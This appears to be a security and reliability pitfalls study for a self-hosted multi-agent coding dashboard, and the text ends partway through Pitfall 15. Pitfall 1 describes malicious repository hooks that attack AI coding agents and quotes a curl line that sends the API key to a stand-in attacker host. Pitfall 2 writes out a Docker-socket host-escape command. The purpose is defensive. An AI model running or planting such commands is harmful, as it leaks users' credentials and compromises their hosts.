# Pitfalls Research

**Domain:** Multi-AI agent management dashboard (self-hostable Docker stack with isolated coding-agent containers, PixiJS UI, secrets vault, Telegram sidecar)
**Researched:** 2026-05-13
**Confidence:** HIGH (most pitfalls reference public CVEs or documented vendor/library issues; a handful flagged MEDIUM where only secondary sources support the claim)

---

## Critical Pitfalls

### Pitfall 1: Malicious-repo RCE via `.claude/`, `.mcp.json`, settings, and hook config files

**What goes wrong:**
A user adds a new agent against a repo URL. The repo is cloned into the agent container. Before the user types anything, the Claude Code SDK reads `.claude/settings.json`, `.claude/hooks/*`, `.mcp.json`, and environment-overriding settings inside the repo. Hooks, MCP server definitions, or `ANTHROPIC_BASE_URL` redirects execute shell commands or exfiltrate the API key — **before any trust prompt completes**. This is exactly what CVE-2025-59536 (CVSS 8.7, code execution pre-trust) and CVE-2026-21852 (CVSS 5.3, API key exfil via `ANTHROPIC_BASE_URL` injection) demonstrated against Claude Code prior to v1.0.111 / v2.0.65.

Concrete failure scenario: user clones a popular-looking open-source project off GitHub; `.claude/hooks/PreToolUse` runs `curl http://attacker.tld/`pwd`?key=$ANTHROPIC_API_KEY` the instant the agent starts. Even on the patched SDK, the **surface area is enormous**: `.claude/`, `.mcp.json`, `CLAUDE.md`, `.cursor/`, `AGENTS.md`, `.github/copilot-instructions.md`, `.devcontainer/`, `.vscode/tasks.json`, `Makefile`, `package.json` install hooks, `.gitattributes` filters, git hooks under `.git/hooks/`, pre-commit configs, `pyproject.toml` build backend hooks.

**Why it happens:**
SDK reads project-local config before showing any prompt. Developers assume "I cloned but didn't run" = safe. The agent runtime sees the repo files as trustworthy input.

**Detection:**
- Pre-spawn lint: scan freshly cloned repo for `.claude/`, `.mcp.json`, `.cursor/`, `.devcontainer/devcontainer.json`, `.git/hooks/`, settings files that set `*_BASE_URL`, `*_API_KEY`, `PATH`, `LD_PRELOAD`, or any hook-style config. Log the inventory and flag in UI.
- Container egress logs: any DNS/HTTP from an agent container to a host not on the explicit allowlist (provider API + git host) is a hard alert.
- Audit log for "agent issued first API call to host X" — if X ≠ `api.anthropic.com` / `api.openai.com`, kill the container.

**Prevention:**
1. **Containerise every agent** — no exceptions, no PTY fallback (PROJECT.md decision already locks this in).
2. **Strip-and-rehydrate policy**: when cloning, remove or quarantine `.claude/`, `.mcp.json`, `.cursor/`, `.devcontainer/`, `.git/hooks/` before the agent process is spawned. Move them to `.quarantine/` inside the workspace and show the user a "this repo wants to run X hooks — approve each?" dialog (similar to how VS Code Workspace Trust handles `tasks.json`). Never auto-approve.
3. **Egress allowlist via the container's own firewall**: `--network` on a custom bridge with iptables OUTPUT rules permitting only `api.anthropic.com:443`, `api.openai.com:443`, and the repo's git host. Block everything else, including `169.254.169.254` (cloud metadata).
4. **Read-only root + dropped caps**: `--read-only --cap-drop ALL --security-opt no-new-privileges`. Mount only the workspace as RW.
5. **Pin SDK versions** to known-patched: `@anthropic-ai/claude-agent-sdk >= 2.0.65` minimum; refuse to start if older.
6. **Disable env overrides**: pass `CLAUDE_CONFIG_DIR` explicitly to a backend-controlled directory; strip any `ANTHROPIC_*` env vars from the repo's `.env` files before spawning.

**Severity:** CRITICAL
**Phase to address:** Phase: Agent Runtime / Sandbox (must land in the same phase that introduces agent containers — not "harden later")
**References:**
- CVE-2025-59536 — pre-trust RCE via hooks/MCP
- CVE-2026-21852 — API key exfil via `ANTHROPIC_BASE_URL` settings injection
- Check Point Research "Caught in the Hook" report

---

### Pitfall 2: Docker socket mounted into the backend container

**What goes wrong:**
Backend uses `dockerode` to spawn agent containers, so the natural shortcut is `-v /var/run/docker.sock:/var/run/docker.sock` on the backend service. Anyone who pops the backend (Node prototype pollution, SSRF, deserialization of an admin token) gets full Docker API access. From there: `docker run -v /:/host -it alpine sh` → root on host. CVE-2025-9074 (CVSS 9.3) is a recent reminder: even Docker Desktop's *internal* API exposure to containers was exploitable. A real exposed socket is worse.

Add the malicious-repo angle: if Pitfall 1's egress allowlist is bypassed by a clever DNS rebinding or by leveraging an MCP server on the backend host (not in the sandbox), a compromised agent container can talk to the backend, which talks to docker.sock, which talks to the host.

**Detection:**
- Static check at boot: log error if backend container can stat `/var/run/docker.sock`. Refuse to start without `DOCKER_HOST` set to the proxy URL.
- Network ACL audit: backend's only outbound to docker should be `tcp://socket-proxy:2375`.
- Penetration test in CI: spawn a container that tries to call `/containers/create` with a `Binds: ["/:/hostroot"]` payload; the test passes if the proxy returns 403.

**Prevention:**
- **Use a socket proxy** (`linuxserver/docker-socket-proxy` or `Tecnativa/docker-socket-proxy`) as a sidecar. Allowlist endpoints: `CONTAINERS=1`, `IMAGES=1`, `NETWORKS=1`, `EXEC=1`, `POST=1`. Block: `CONFIGS`, `SECRETS`, `SWARM`, `SYSTEM`, `VOLUMES=0` (we provision volumes at compose-time, not runtime), `BUILD=0`, `PLUGINS=0`.
- Backend connects via `DOCKER_HOST=tcp://socket-proxy:2375`.
- Run backend as a non-root UID; the proxy itself uses the socket and runs in its own minimal image.
- Optionally: run Docker in **rootless mode** on the host so even a successful container escape only yields the unprivileged user.

**Severity:** CRITICAL
**Phase to address:** Phase: Foundation / Docker Compose stack (the proxy must be in the compose file from day one; retrofitting later means the dev/staging deployments are exploitable in the interim)
**References:**
- CVE-2025-9074 — Docker Desktop privilege escalation
- OWASP Docker Security Cheat Sheet
- HackTricks "Abusing Docker Socket for Privilege Escalation"

---

### Pitfall 3: API keys leaking into logs, transcripts, error pages, and telemetry

**What goes wrong:**
Provider keys (Anthropic, OpenAI, Telegram bot tokens) end up in:
- Fastify request logs (`pino` logs the headers; `Authorization: Bearer sk-…` is captured),
- Claude Code session JSONL transcripts (a hook that prints env or a tool that echoes a config file),
- Stack traces shipped to a Sentry/PostHog backend "for debugging",
- Browser DevTools (key shipped to frontend "just for one feature"),
- Crash dumps inside the agent container volume that ends up in the user's tar backup,
- The repo itself if the agent runs `git add .` over a `.env` file the user dropped in the workspace.

Telegram bot tokens are particularly painful: leak the token and an attacker can proxy messages to your agent, which has write access to your repos (the SIGMA bot incident on 2026-05-11 drained $200K because of exactly this kind of token compromise).

**Detection:**
- Log scrubber unit tests with property-based fuzzing: generate fake `sk-ant-…`, `sk-…`, `[0-9]+:[A-Za-z0-9_-]{35}` (Telegram pattern) and assert they never appear in stdout/stderr after passing through the logger.
- GitGuardian / `trufflehog` scan of every backup tarball and of any volume snapshot before it leaves the box.
- Browser-side check: `window.fetch` interceptor in dev mode that throws if any request body contains a key-shaped string.

**Prevention:**
1. **Backend boundary**: keys live in the vault, decrypted in memory only at the moment of dispatch. Never logged, never serialized into JSON responses, never returned to the browser.
2. **Pino redaction**: configure `redact: ['*.authorization', '*.api_key', '*.api-key', '*.x-api-key', 'env.ANTHROPIC_API_KEY', 'env.OPENAI_API_KEY', 'env.TELEGRAM_BOT_TOKEN']` with `censor: '[REDACTED]'`.
3. **Transcript filter**: post-process the SDK's JSONL session log on the way to disk; regex-strip key-shaped tokens before persisting.
4. **Telegram-bot-token hashing**: store the token encrypted, but **also store a SHA-256 of the token** so the UI can confirm "this is the bot ending in ...4f3a" without ever decrypting.
5. **Telemetry: opt-in only**, and never include request/response bodies, only metric counters.
6. **First-run admin password**: print to stdout of the *backend container* AND write to `${VOLUME}/INITIAL_SECRETS.txt` mode 0600, with a UI banner "rotate me" until the user actually rotates.
7. **Bot token rotation flow** must be one click — if a leak is suspected, the user needs to revoke + replace in under a minute. Telegram lets you regenerate via `@BotFather` `/revoke`; surface that link in the UI.

**Severity:** CRITICAL
**Phase to address:** Phase: Secrets Vault (log redaction config must land in the same phase as the vault; retrofitting later means key-shaped strings are already in old logs)
**References:**
- GitGuardian Telegram Bot Token remediation guide
- SC Media "Hackers leak their own operations through exposed Telegram Bot API tokens"
- Picus Security PupkinStealer analysis — hardcoded bot token in malware enables hijack

---

### Pitfall 4: Rate-limit and cost runaway when N agents share one API key

**What goes wrong:**
User creates 8 agents, all bound to the same Anthropic key. Two of them get stuck in a "fix the failing test" loop. Each turn appends 50K input tokens to the context. The user is on Tier 2 (40K input tokens / minute). All 8 agents start hitting 429s and entering exponential backoff, but each retry costs a token charge anyway. The user wakes up to a $400 bill and 0 progress.

Anthropic limits are per-organization, measured in **input TPM** (which dominates because context grows). Claude Code's accumulated history makes input-TPM the binding constraint — not requests-per-minute as people naively expect.

**Detection:**
- Per-key, per-agent cost/turn metrics in the dashboard.
- Alert when an agent issues more than N tool calls in a row without a user message (loop heuristic).
- 429 spike: if more than 25% of requests in a 5-minute window get rate-limited, page the user in-UI ("4 agents are starving the same key").
- Daily spend forecast vs. budget threshold in the office overview.

**Prevention:**
1. **Per-agent hard budgets**: `max_usd_per_session`, `max_turns`, `max_tool_calls_per_minute`. Default to conservative (e.g. $5, 50 turns, 30 calls/min). Surface in UI on every agent card.
2. **Org-level circuit breaker**: aggregate USD spend across all agents on a shared key; when > daily cap (default $20), all agents on that key pause and show a confirm prompt.
3. **Request shaping**: a small queue in the backend per provider key with a sliding-window TPM tracker. If the next request would exceed 80% of the key's TPM, delay it. Better to make a user wait 30s than to take a 429 (Anthropic's [exponential backoff doc](https://docs.anthropic.com/en/api/rate-limits) confirms backoff is the expected client behavior).
4. **One key per agent recommended path**: vault supports labeling keys by agent; default UI nudges "give this agent its own key" once you create the third agent on the same key.
5. **Loop detector**: if the same file is edited 5+ times in a session with no new user input, auto-pause and ask the user.
6. **Context window monitor** (see Pitfall 5) — capping at 70% prevents the most expensive "full-context retry" turns.

**Severity:** CRITICAL
**Phase to address:** Phase: Agent Runtime (per-agent budget + provider shaping) and Phase: 2D Office UI (live cost display + alert)
**References:**
- Anthropic rate-limits docs (RPM, ITPM, OTPM tiering)
- Anthropic spend-limit feature (org-level monthly cap)

---

### Pitfall 5: Context-window estimation that lies about "70% red"

**What goes wrong:**
PROJECT.md commits to a "context % > 70% → red status" indicator. The SDK does not directly expose context percentage — you must either (a) estimate from `input_tokens` reported in `SDKResultMessage.usage` divided by the model's window, or (b) read the status-line JSON which exposes `context_window.used_percentage` directly. Naïve byte-count or rough "1 token = 4 chars" estimation drifts heavily for code (closer to 1 token = 2-3 chars), so the UI claims "45% used" when reality is "78% and Claude is about to auto-compact". The user trusts the green dot, then suddenly the agent forgets what it was doing because `compact_boundary` fired.

Anthropic's own tiered warnings fire at ~70% and 85% — the system has empirical evidence that precision degrades past 70%, so getting the estimate wrong defeats the entire "color status" feature.

**Detection:**
- Cross-check: after every turn, compare your estimate vs. the `SDKResultMessage.usage.input_tokens / 200_000` vs. the status-line `context_window.used_percentage`. Log divergence; alert if > 5 percentage points.
- Test fixture: a long-running session with code-heavy turns; assert the displayed % is within 3 points of the SDK's reported number.
- Watch for the `SystemMessage` subtype `compact_boundary` — if it fires when the UI shows <60%, the estimator is broken.

**Prevention:**
1. **Trust the SDK's status-line numbers first**, fall back to `usage.input_tokens`, never fall back to char-count heuristics.
2. **Subscribe to `compact_boundary`** SystemMessages and reset the displayed % when compaction occurs (don't just keep accumulating).
3. **Two thresholds**: 70% yellow, 85% red, matching Claude Code's internal tiering. Document this clearly in the UI tooltip.
4. **Per-model windows**: 200K for Sonnet/Opus, 1M for Sonnet 1m, varies for OpenAI models. Read the actual window from the SDK / provider, don't hardcode.
5. **Tool call cost included**: tool-use tokens count too; make sure `usage.cache_read_input_tokens` and friends are factored.

**Severity:** HIGH
**Phase to address:** Phase: Agent Runtime + Phase: 2D Office UI (the data pipeline must produce a value the UI can trust before the UI is wired)

---

### Pitfall 6: Session resume edge cases (cwd mismatch, deleted worktree, model deprecated)

**What goes wrong:**
The SDK persists sessions at `~/.claude/projects/<encoded-cwd>/<session-id>.jsonl` — and **the encoded-cwd is part of the lookup key**. If the agent container is recreated and the workspace mount path changes (`/workspace/repo` → `/workspaces/repo`), resume silently fails: GH issue [#555](https://github.com/anthropics/claude-agent-sdk-python/issues/555) documents the SDK creating a *new* session with no error when the resume key doesn't match.

Worse scenarios:
- User deletes a git worktree (or the agent itself does so during cleanup) while a session is active. Subsequent shell commands fail with "no such file or directory" and the session is wedged forever ([issues #28287, #29653, #30906](https://github.com/anthropics/claude-code/issues/29653)).
- Model `claude-3-opus-20240229` gets deprecated mid-session. Resume picks the wrong model or 400s.
- Session JSONL was on a volume that the user `docker volume rm`'d. Backend has the session ID in SQLite but no transcript.

**Detection:**
- Resume health-check: on every resume, verify (cwd-on-disk == cwd-stored-in-DB), (session JSONL exists), (model is in the current supported list). Fail loudly with a specific error code, not silently.
- Metric: `session.resume.silent_new_session_count` — if non-zero, alarm.
- On startup, scan the projects directory and reconcile against SQLite — orphaned JSONLs and orphaned DB rows both surface as warnings.

**Prevention:**
1. **Canonicalize cwd**: always mount workspaces at a stable, predictable path (`/workspaces/<agent-id>`), and store the canonical path in DB so resume always uses the same encoded-cwd.
2. **Pin `CLAUDE_CONFIG_DIR`** per agent to `${VOLUME}/agents/<id>/.claude` so sessions live with the agent state, not under the container's `$HOME` which can vanish.
3. **Detect worktree deletion**: on every tool call result, check that cwd still exists; if not, mark the session as "needs new cwd" and prompt the user instead of letting the SDK wedge.
4. **Pin model per session**: store the model name in the agent record; if the provider deprecates it, surface a "migrate session" flow rather than silently switching.
5. **Resume integrity check on archive/unarchive**: tarballing the volume should validate that every active agent's session JSONL is readable before reporting "backup complete".

**Severity:** HIGH
**Phase to address:** Phase: Agent Runtime (session lifecycle is core; pinning cwd and config dir affects all later phases)
**References:**
- claude-agent-sdk-python issue #555 (silent new session)
- claude-code issues #28287 / #29653 / #30906 (deleted worktree + resume cwd)

---

### Pitfall 7: SQLite in WAL mode on a Docker volume backed by a network filesystem

**What goes wrong:**
Portability requirement says "a single mountable volume" — perfectly fine on local storage. The moment a user puts the Docker volume on NFS, SMB, or a Synology share, **SQLite WAL mode corrupts**. POSIX advisory locks are buggy over NFS; the `*-shm` file requires shared memory that doesn't work across networked storage; two clients (e.g. a host-side backup script and the backend container) see different lock states and corrupt the database. SQLite's own docs are explicit: "your best defense is to not use SQLite for files on a network filesystem." The OpenCode #14970 incident (Feb 2026) is a recent real-world corruption with stale `.nfs*` handles next to a malformed DB.

There's also the 2026-03-03 SQLite "WAL-reset bug" (affecting 3.7.0 through 3.51.2) which corrupts on simultaneous writer+checkpointer in separate processes — make sure to bundle a fixed SQLite version.

**Detection:**
- Boot-time check: stat the data directory's filesystem type (`statfs.f_type`). If it's NFS (0x6969), SMB/CIFS (0xFF534D42), or FUSE (0x65735546), refuse to start with a clear error message.
- Periodic `PRAGMA integrity_check` (cheap) + nightly `PRAGMA quick_check`.
- Backup verification: every nightly tar must be re-imported into a throwaway container and `integrity_check`'d before being marked "good".
- Detect WAL grew unbounded (checkpoint starvation): alert if `*-wal` > 64 MB.

**Prevention:**
1. **Refuse-to-run on networked storage** by default, with a `--i-know-what-im-doing` flag for users who insist (and document the rollback-mode workaround).
2. **Use rollback journal mode, not WAL**, if the user insists on networked storage — slower, but doesn't rely on shared-memory locks.
3. **Bundle a known-good SQLite** (≥ 3.51.3 to avoid the WAL-reset bug); pin `better-sqlite3` version.
4. **Single writer**: only the backend process writes to SQLite. The Telegram sidecar talks to the backend over HTTP, **never opens the DB directly**.
5. **`busy_timeout = 5000`** and `synchronous = NORMAL` for WAL mode; `journal_size_limit` to prevent unbounded WAL growth.
6. **Periodic `PRAGMA wal_checkpoint(TRUNCATE)`** on a low-traffic timer so the WAL doesn't bloat.
7. **Graceful shutdown handler**: trap SIGTERM, `db.close()` properly so the last checkpoint flushes.

**Severity:** HIGH
**Phase to address:** Phase: Foundation / Persistence (DB choices set in stone here)
**References:**
- SQLite "How To Corrupt An SQLite Database File"
- SQLite WAL-reset bug fix (2026-03-03)
- better-sqlite3 issue on Docker volume + WAL corruption

---

### Pitfall 8: Auto-HTTPS edge cases (Let's Encrypt rate limits, no public domain, IPv6-only host)

**What goes wrong:**
The "bundled Caddy with automatic HTTPS via Let's Encrypt" promise breaks the first time someone:
- Brings the office up on a laptop with no public DNS → Caddy spams ACME challenges and gets the **account** rate-limited (300 failed validations / account / 5h).
- Tears down + brings up + tears down + brings up while iterating on the compose file with the same hostname → hits the "5 duplicate certs per FQDN set per 7 days" cap. The March 12, 2026 cert-manager outage took down 14,000+ services for 127 minutes from exactly this scenario — a tightened renewal window slammed into Let's Encrypt's duplicate limit.
- Runs on an IPv6-only host but the ACME challenge falls back to IPv4.
- Runs on a host where port 80 isn't reachable from the internet (typical home LAN) — HTTP-01 challenge fails forever.

**Detection:**
- Caddy logs `acme: error:` lines — surface in UI, don't bury in container logs.
- Count failed-cert-issuance attempts; if > 3 in 24h, switch to staging or internal CA.
- Pre-flight check at first boot: resolve the configured hostname's A/AAAA, attempt a TCP connect on 80/443 from an external probe (or warn "we can't verify reachability").

**Prevention:**
1. **HTTPS optionality**: default to HTTP-on-LAN with a self-signed cert and a clearly-displayed fingerprint. Users explicitly enable Let's Encrypt via `OFFICE_DOMAIN=foo.example.com OFFICE_ACME=true` after they've set DNS.
2. **Default to ACME staging**, switch to production only after a successful staging issuance is verified — prevents account-level rate limits on first-run misconfigurations.
3. **Caddy's built-in `internal` CA** as the LAN fallback (`tls internal`); print the CA cert to the user so they can trust it once.
4. **Renewal window ≥ 7 days** (Caddy default is fine; do not configure aggressively). 2026 lesson: don't fight Let's Encrypt's rate-limit windows.
5. **TLS-ALPN-01 / DNS-01** support documented for users behind NAT — port 80 isn't always available.
6. **HSTS off by default**: user might revert to HTTP if cert flow breaks, and a stale HSTS pin locks them out of the UI for a year.

**Severity:** HIGH (UX-breaking on first run for many users)
**Phase to address:** Phase: Foundation / Reverse proxy
**References:**
- Let's Encrypt Rate Limits docs (5 duplicate FQDN sets / 7 days, 300 failed validations / account / 5h)
- Let's Encrypt March 12, 2026 outage postmortem (cert-manager renewal window)

---

### Pitfall 9: Telegram bot lifecycle — polling conflicts, webhook collisions, blocked-by-user

**What goes wrong:**
- Polling (`getUpdates`) only allows **one consumer per token**. Restart the Python sidecar without a clean shutdown (or run dev + prod with the same token) and Telegram returns `409 Conflict: terminated by other getUpdates request`. Bot becomes silent. [node-telegram-bot-api#550](https://github.com/yagop/node-telegram-bot-api/issues/550) and many Home Assistant threads document this exact issue.
- Switching between polling and webhooks: if a webhook is set, `getUpdates` returns nothing — users add a bot, see no messages, can't figure out why.
- Bot blocked by user: `sendMessage` returns 403. Naïve code retries forever. Polite code marks the chat as blocked and stops.
- The race: user clicks "switch bot to agent B" in the web UI; mid-switch, agent A's worker still has a `sendMessage` in flight. Wrong context shows up.
- Container restart kills the polling loop but Telegram still buffers updates for ~24h → on restart, a flood of old commands replays as fresh.

Combine with **token theft** (Picus Security PupkinStealer analysis, SC Media bissapwned_bot research, May 2026 SIGMA-bot crypto theft): if your token leaks, an attacker proxies messages to your agent, your agent now has someone else driving it with write access to your repos.

**Detection:**
- 409 from Telegram → emit a high-severity event; the UI shows "bot ending in …4f3a is being polled elsewhere; rotate the token."
- Track `update_id` continuity; if a gap > 60s appears with `pending_update_count > 0` on `getMe`, the sidecar isn't keeping up.
- `webhookInfo` endpoint poll on agent attach: log if a webhook is set when polling mode is selected.

**Prevention:**
1. **Single polling lock** in Redis (`SET tg:lock:<bot_id> <instance_id> NX PX 30000`); only the holder polls; renewed every 10s. Prevents double-polling on rolling deploy.
2. **Atomic switch**: when reassigning a bot from agent A to B, stop A's polling (`deleteWebhook(drop_pending_updates=true)`, release lock), then start B's polling. UI shows "switching…" with a spinner.
3. **Webhook mode for production**: prefer webhooks over polling when the office is publicly accessible (Caddy + HTTPS already provides the endpoint). Polling only as LAN-mode fallback.
4. **Token hash + display**: store a SHA-256 fingerprint; the UI always shows "bot ID 1234, ending in …4f3a" so the user can verify against `@BotFather`.
5. **One-click revoke**: deep-link to `https://t.me/BotFather` `/revoke` in the UI; instruct user that revoking invalidates the token globally.
6. **Audit log** of every Telegram message in and out, with bot ID, agent ID, chat ID — if a token is leaked, the audit log proves whether the attacker actually drove the agent.
7. **`/start` whitelist**: only the configured admin Telegram user ID gets responses. All other chats: silent ignore.

**Severity:** HIGH
**Phase to address:** Phase: Telegram Integration
**References:**
- node-telegram-bot-api issue #550 (409 conflict)
- Home Assistant Telegram 409 community threads
- Picus Security PupkinStealer analysis (hardcoded bot tokens enable hijack)

---

### Pitfall 10: Memory exhaustion from N agent containers each running a Node-based Claude Code subprocess

**What goes wrong:**
Each `claude-agent-sdk` subprocess inside an agent container holds ~200-500 MB RSS (Node + V8 + cached tools + transcript buffer). User spins up 8 agents on a 4 GB VPS → kernel OOM-killer picks the backend, everything goes dark. Or the agents themselves get killed mid-edit, leaving git in a half-staged state and the SDK session log truncated.

Same risk inverted: a single misbehaving agent that loads a huge file into context can balloon to 2-3 GB on its own and starve siblings.

**Detection:**
- Per-container `memory.usage_in_bytes` from cgroups; aggregate in the office overview ("Memory: 3.2 / 4.0 GB across 6 agents").
- Alert when host free RAM < 200 MB or swap-in rate > 10 MB/s.
- OOM killer events: `dmesg | grep -i oom` parsed by the backend; if any agent was killed, mark the agent as "OOM-restarted" and prompt the user before auto-restart.

**Prevention:**
1. **Per-container memory limit**: `--memory 512m --memory-swap 512m` (no swap), enforced at create-time. Surfaced in the agent settings UI.
2. **Backend reservation**: backend container reserves 512 MB minimum; agents share what's left.
3. **Pre-spawn admission control**: refuse to start a new agent if free memory < (limit + 256 MB buffer); show "host out of memory" UI instead of silently OOM-killing later.
4. **OOM auto-restart with backoff**: 3 OOMs in 30 min → mark agent as crash-looping, require user intervention.
5. **Shared model cache**: if all agents on the same host run the same SDK version, share the npm/`~/.cache` via a read-only bind mount to avoid duplicating ~150 MB per container.
6. **Document minimum host specs**: README's "minimum 8 GB RAM for 4 agents" is honest; don't promise 1-GB VPS support.

**Severity:** HIGH
**Phase to address:** Phase: Agent Runtime / Container management

---

### Pitfall 11: Encrypting secrets with a master key the user can lose — or can't change

**What goes wrong:**
Two failure modes, opposite ends:

A) **Lost master key = lost vault.** User loses the auto-generated master key (rebooted host before reading `INITIAL_SECRETS.txt`, scp'd the volume without the env file, lost the password manager entry). Every API key and bot token in the vault is now ciphertext nobody can decrypt. User has to re-add everything from each provider's console.

B) **Master key derived from something the user can change but the vault doesn't re-encrypt.** User updates their admin password → vault breaks (if password is the key) or password is meaningless to security (if it's not). Bitwarden's KDF model is the reference: master password → master key via KDF, master key encrypts a separately-generated symmetric key, symmetric key encrypts vault data. Rotating the password re-derives the master key and re-encrypts only the symmetric key.

The PROJECT.md spec says "master key from env or KMS" — that's the cipher key, but it doesn't say what happens if the user wants to change it, or how the user is supposed to remember it through a `docker compose down && up` cycle.

**Detection:**
- First-boot UX test: spin up clean, kill, restart — does the user lose access? Should not.
- Rotate-master-key flow test: change `MASTER_KEY` env var → backend re-encrypts and restarts without data loss.
- Volume restore test: tar a volume on host A, restore on host B with the *correct* master key — works; restore *without* the key — clear "vault is locked, master key required" error, not crash.

**Prevention:**
1. **Two-layer key model** (Bitwarden-style):
   - `MASTER_KEY` env var (32 bytes from `openssl rand -base64 32`) is the *outer* key.
   - An internal `DATA_KEY` is generated once at install, encrypted with `MASTER_KEY` using AES-256-GCM, stored in SQLite.
   - All vault entries are encrypted with `DATA_KEY`.
   - Rotating `MASTER_KEY` re-encrypts only the wrapped `DATA_KEY` row — fast, atomic.
2. **First-run unambiguous output**: on first boot, write the master key to **three places**: stdout of the backend container, `${VOLUME}/INITIAL_SECRETS.txt` mode 0600, and a QR code the admin UI displays once. UI nags "I've backed this up" until the admin acknowledges.
3. **Recovery escrow (optional)**: print a 24-word BIP39 mnemonic of the master key the user can write down. Document that anyone with the mnemonic owns the vault.
4. **Refuse to start with placeholder key**: if `MASTER_KEY=changeme` or unset, generate once and persist (auto-bootstrap), but never proceed with a known weak key.
5. **Argon2id** (not scrypt, not raw bytes) for any user-passphrase-derived key — RFC 9106, OWASP recommendation, parameters t=3, m=64MB, p=4 as 2026 minimums.

**Severity:** HIGH (data-loss class)
**Phase to address:** Phase: Secrets Vault
**References:**
- Bitwarden Encryption Key Derivation docs (two-layer model)
- OWASP password hashing — Argon2id RFC 9106

---

### Pitfall 12: Auto-bootstrap prints credentials to a place the user never sees

**What goes wrong:**
First run on a fresh VPS. User runs `docker compose up -d` (detached). The auto-bootstrap prints the admin password and access URL to the backend container's stdout — which is gone the moment the container restarts or logs rotate. User now has a running but inaccessible office.

Variants:
- Password written to `${VOLUME}/INITIAL_SECRETS.txt` but the user's compose file mounted the volume at a path they didn't realize, so they can't find the file.
- URL printed includes `localhost`, but the user is on a VPS and needs the public IP.
- ACME provisioning is still running at bootstrap-time, so the URL printed is HTTP but the user later configures HTTPS and the printed URL 404s.

**Detection:**
- Smoke test: in CI, run `docker compose up -d`, wait 90s, parse `docker compose logs backend` for the `INITIAL_SECRETS:` line; assert it's present and well-formed.
- First-run "did you see this?" gate: backend refuses to mark itself "production" until the user logs in once and explicitly dismisses a "I've saved my credentials" banner.

**Prevention:**
1. **Print to all three sinks always**: stdout (foreground users see it), `${VOLUME}/INITIAL_SECRETS.txt` mode 0600 (persists across restarts), and a one-time QR code on first login.
2. **`docker compose up` foreground guidance** in the README: print "first time? run without `-d` so you see the password" as the very first line.
3. **`docker compose logs --since=10m | grep INITIAL_SECRETS`** command in the troubleshooting doc.
4. **Reset endpoint**: a `docker compose exec backend node reset-admin.js` script that prints a fresh password without nuking the vault.
5. **Health endpoint exposes URL**: `GET /healthz` returns the canonical public URL the backend thinks it's at; the user can compare against what they configured.

**Severity:** HIGH (UX-killer on first run, support burden)
**Phase to address:** Phase: Foundation / Bootstrap

---

### Pitfall 13: WebSocket disconnects on mobile (NAT timeout, backgrounding, IP change)

**What goes wrong:**
PWA on phone, user opens the office, watches an agent's progress. Locks the phone. iOS suspends the WebView's TCP socket within 30s. Carrier-grade NAT drops the mapping after 30-120s of idle. User opens the app 5 minutes later — WebSocket says "connected" (it was never told it wasn't) but no messages are flowing. User refreshes; missed events are lost because the backend forgot the connection on its side too.

iOS Safari has a documented WebSocket-suspension regression ([WebKit bug 228296](https://bugs.webkit.org/show_bug.cgi?id=228296)). Cellular NAT timeouts as low as 30s are confirmed by mobile WebSocket guidance.

**Detection:**
- Heartbeat round-trip metric: median RTT, P99, and reconnect rate broken out by user-agent (iOS vs Android vs desktop).
- "Stuck connection" detection: if no inbound `pong` for 3 consecutive `ping`s, force-close client-side and reconnect.
- Sequence-number gaps: client tracks `last_event_id`; if a reconnect produces an `event_id` jump > 1, log "we missed events" and re-request from the gap.

**Prevention:**
1. **Heartbeat every 25s** (ping/pong), well under typical NAT timeouts.
2. **Visibility-change handler**: when `document.visibilitychange` fires `hidden`, mark the socket as "may be dead"; on `visible` again, send an immediate ping and reconnect if no pong in 2s.
3. **Sequence numbers + replay**: every server-sent event has an `id`; client passes `Last-Event-ID` on reconnect; backend buffers last N seconds of events per session so missed ones can replay.
4. **Exponential backoff with jitter** on reconnect: 500ms → 1s → 2s → … cap at 30s, random jitter ±25%.
5. **Network-change listener**: `navigator.connection.addEventListener('change', …)` (or visibilitychange + an `online` event) triggers a precautionary reconnect.
6. **Fallback to SSE or long-poll** if WebSocket fails repeatedly (some corporate proxies / mobile carriers strip WS upgrade headers).

**Severity:** HIGH (phone-first UX requirement makes this load-bearing)
**Phase to address:** Phase: 2D Office UI + Phase: Backend API (the heartbeat + replay protocol must land together)
**References:**
- WebKit 228296 — iOS 15 WebSocket regression
- WebSocket.org NAT/timeout troubleshooting guide

---

### Pitfall 14: PWA cache invalidation when the backend protocol changes

**What goes wrong:**
User installs the PWA on their phone. Service worker caches `/api` responses and the SPA shell. Two weeks later, the backend ships a breaking change to `/api/agents` (new required field). User's phone still serves the stale SW; the new backend rejects the old shape; the agent panel shows a generic error and the user has no idea their app is stale.

**Detection:**
- Server includes a `X-Office-Protocol-Version` header on every response.
- Client checks at boot; if its bundled version != server header, force-refresh the SW.
- Sentry-style error correlation: a spike of 400s from clients on protocol v3 hitting backend v4 = stale-PWA issue.

**Prevention:**
1. **Versioned API paths** (`/api/v1/...`) so old clients still get a valid (if deprecated) response.
2. **SW with `skipWaiting()` + `clientsClaim()`** in `install`; client shows "update available, reload?" toast.
3. **Cache-busting via build hash** on all JS/CSS; never cache `/api/*` responses in the SW for more than a session.
4. **Protocol version mismatch banner**: backend tells the client its version, client tells the backend its version, if they're incompatible the UI hard-blocks with "your app is out of date; tap to update".
5. **Server-side feature flags** for breaking changes — old clients get the old shape until they upgrade.

**Severity:** MEDIUM
**Phase to address:** Phase: 2D Office UI / PWA

---

### Pitfall 15: PixiJS sprite churn → texture memory leak

**What goes wrong:**
The 2D office shows N agents as sprites with status colors, card overlays, animated state. Agents come and go (create, archive, delete). Every status change creates a new sprite/Graphics. If `destroy({ texture: true, baseTexture: true })` isn't called explicitly, textures linger on the GPU; the TextureGCSystem only collects after 3600 frames of non-use. On long-running mobile sessions with frequent status flips, GPU memory creeps up until the tab is killed.

PixiJS v8 specifically has a documented Graphics destruction leak ([pixijs#10586](https://github.com/pixijs/pixijs/issues/10586)) and a renderGroup-cleanup leak ([#10533](https://github.com/pixijs/pixijs/issues/10533)).

**Detection:**
- DevTools Memory profiler: heap snapshot before/after toggling agent statuses 100 times; PIXI.Texture count should be stable.
- Custom `Ticker` callback every N frames: assert `app.renderer.texture.managedTextures.length < expected_max`.
- Long-soak test on a real phone (60 minutes, animations active) with WebGL inspector watching GPU memory.

**Prevention:**
1. **Sprite pooling**: never create a new sprite per status change; mutate `sprite.tint`, `sprite.texture`, `sprite.visible` on a small pool of preallocated sprites.
2. **Explicit destroy** on every removed sprite: `sprite.destroy({ children: true, texture: false, textureSource: false })` (keep shared textures) or with both `true` only for sprite-unique textures.
3. **One Spritesheet** for all desk/avatar/status assets; never call `Texture.from(url)` per render.
